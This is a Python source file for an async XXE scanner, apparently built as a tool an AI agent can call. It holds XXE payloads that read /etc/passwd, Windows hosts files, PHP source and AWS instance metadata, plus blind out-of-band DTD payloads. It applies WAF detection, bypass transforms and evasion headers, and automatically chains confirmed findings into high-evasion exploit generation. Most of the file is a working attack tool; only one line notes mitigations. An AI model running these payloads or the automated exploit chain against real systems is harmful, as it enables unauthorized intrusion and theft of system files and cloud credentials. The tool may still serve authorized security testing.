from src.sdk.tool import function_tool
from .common import (
    _detect_waf,
    _get_evasion_headers,
    _waf_transform_payloads,
    async_fetch_all,
    register_appsec_vulnerability,
)

# ─── XXE  (XML External Entity) ──────────────────────────────────────────────────

@function_tool()
async def xxe_scanner(url: str, parameter: str = "", content_type: str = "application/xml", oast_domain: str = "") -> str:
    """
    Scan for XML External Entity (XXE) vulnerabilities (Async Engine).
    Automatically applies WAF bypasses if a WAF is detected.
    Supports blind XXE detection via OAST domain.
    
    Args:
        url: Target URL that accepts XML input
        parameter: Parameter name for XML data (or empty for raw body)
        content_type: Content-Type header
        oast_domain: Domain for OAST detection (e.g. burpcollaborator.net)
    
    Returns:
        XXE scan results
    """
    results = []
    results.append(f"## XXE Scan (Async Engine) for {url}\n")
    
    base_payloads = [
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "file:///etc/passwd"),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><foo>&xxe;</foo>', "Windows hosts file"),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>', "PHP source code"),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>', "AWS metadata"),
    ]

    if oast_domain:
        base_payloads.append((
            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{oast_domain}/xxe.dtd"> %xxe;]><foo>blind</foo>',
            "Blind XXE via External DTD"
        ))
        base_payloads.append((
            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://xxe-test.{oast_domain}/">]><foo>&xxe;</foo>',
            "Blind XXE OOB Request"
        ))
    
    waf_vendor, waf_conf = _detect_waf(url)
    if waf_conf > 0.2:
        results.append(f"⚠ WAF Detected: {waf_vendor} (confidence: {int(waf_conf*100)}%)")
        results.append(f"  → Applying {waf_vendor}-specific XML bypass transforms\n")
        
    payloads = []
    for xml_text, desc in base_payloads:
        transformed = _waf_transform_payloads([xml_text], "xxe", url=url, waf_vendor=waf_vendor)
        for t_p in transformed:
            payloads.append((t_p, desc))
    
    headers = _get_evasion_headers({"Content-Type": content_type})
    
    async_requests = []
    for payload, description in payloads:
        req = {
            "method": "POST",
            "url": url,
            "headers": headers,
            "_payload": payload,
            "_desc": description
        }
        if parameter:
            req["data"] = {parameter: payload}
        else:
            req["data"] = payload  # Raw body
            
        async_requests.append(req)
        
    results.append(f"🚀 Launching async swarm for {len(async_requests)} XXE payloads...")
    scan_results = await async_fetch_all(async_requests, max_concurrent=20, timeout_sec=15)
    
    vulnerable = []
    
    indicators = [
        "root:", "daemon:",  # /etc/passwd
        "localhost",  # hosts file  
        "<?php", "<?=",  # PHP source
        "ami-", "instance-id",  # AWS metadata
    ]
    
    for res in scan_results:
        req_meta = res["req"]
        desc = req_meta["_desc"]
        payload = req_meta["_payload"]
        
        if res["error"]:
            continue
            
        text = res["text"]
        for indicator in indicators:
            if indicator in text:
                vulnerable.append({
                    "description": desc,
                    "evidence": indicator,
                    "payload": payload
                })
                break
    
    # Summary
    results.append("\n## Summary")
    if vulnerable:
        results.append(f"🔴 Found {len(vulnerable)} XXE vulnerabilities!")
        
        for vuln in vulnerable:
            results.append(f"  - {vuln['description']}: Found '{vuln['evidence']}'")
            
            await register_appsec_vulnerability(
                target_url=url,
                vuln_type="XML External Entity (XXE)",
                severity="CRITICAL",
                parameter=parameter if parameter else "XML Body",
                payload=vuln['payload'],
                evidence=vuln['evidence']
            )
            
        # ── Auto-Exploit Chaining ─────────────────────────────────────
        results.append("\n## Autonomous Exploit Generation")
        try:
            from src.tools.exploit_craft import generate_exploit_code
            
            context_str = f"Target URL: {url}\nContent-Type: {content_type}\n\nConfirmed Vulnerabilities:\n"
            for v in vulnerable[:2]:
                context_str += f"- {v['description']}: Found '{v['evidence']}'\nPayload: {v['payload']}\n"
            
            exploit_result = await generate_exploit_code.invoke(
                vuln_type="XXE",
                target_tech="Unknown Web Application",
                context=context_str,
                evasion_level="high",
                language="python"
            )
            
            results.append("✅ Auto-Exploit successfully generated and saved:")
            results.append("\n".join(exploit_result.split("\n")[:10]) + "\n...")
        except ImportError:
            results.append("⚠️ Exploit engine (exploit_craft) not available in this build.")
        except Exception as e:
            results.append(f"⚠️ Exploit generation failed: {str(e)[:100]}")
            
    else:
        results.append("✅ No reflected XXE detected.")
        if oast_domain:
            results.append(f"💡 Check your OAST server ({oast_domain}) for callbacks indicating blind XXE.")
    
    results.append("\n💡 Mitigation: Disable DTD, External Entities, and Parameter Entities in your XML parser.")
    
    return "\n".join(results)
